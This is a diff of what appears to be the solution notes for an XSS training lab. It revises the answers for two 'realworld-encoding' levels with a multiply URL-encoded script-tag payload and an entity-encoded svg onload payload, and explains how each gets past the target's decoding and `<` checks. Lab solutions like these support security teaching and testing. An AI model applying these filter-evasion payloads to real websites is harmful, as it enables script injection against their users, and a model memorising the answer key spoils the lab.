@@ -66,10 +66,10 @@ Real-world reflection patterns: double sinks, debug flags, truncation, headers, 
 
 ### realworld-encoding-level1
 
-`/realworld-encoding/level1/?query=%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E`
+`/realworld-encoding/level1/?query=%2525253Cscript%2525253Ealert%252525281%25252529%2525253C%2525252Fscript%2525253E`
 
-- payload (final): `<script>alert(1)</script>` (triple-URL-encoded)
-- context: 3x URL decode; first two decoded states must not contain literal < >
+- payload: `%2525253Cscript%2525253Ealert%252525281%25252529%2525253C%2525252Fscript%2525253E`
+- context: one framework decode plus two handler decodes before the `<` check, then one more on output: encode four times
 
 ### realworld-encoding-level2
 
@@ -80,10 +80,10 @@ Real-world reflection patterns: double sinks, debug flags, truncation, headers, 
 
 ### realworld-encoding-level3
 
-`/realworld-encoding/level3/?query=%26lt%3Bsvg%20onload%26%2361%3Balert%26%2340%3B1%26%2341%3B%26gt%3B`
+`/realworld-encoding/level3/?query=%26lt%3Bsvg%20onload=alert(1)%26gt%3B`
 
-- payload: `&lt;svg onload&#61;alert&#40;1&#41;&gt;`
-- context: single-pass entity decode → `<svg onload=alert(1)>` rendered
+- payload: `&lt;svg onload=alert(1)&gt;`
+- context: only &lt;/&gt; are decoded, so write = ( ) literally
 
 ### realworld-encoding-level4
 
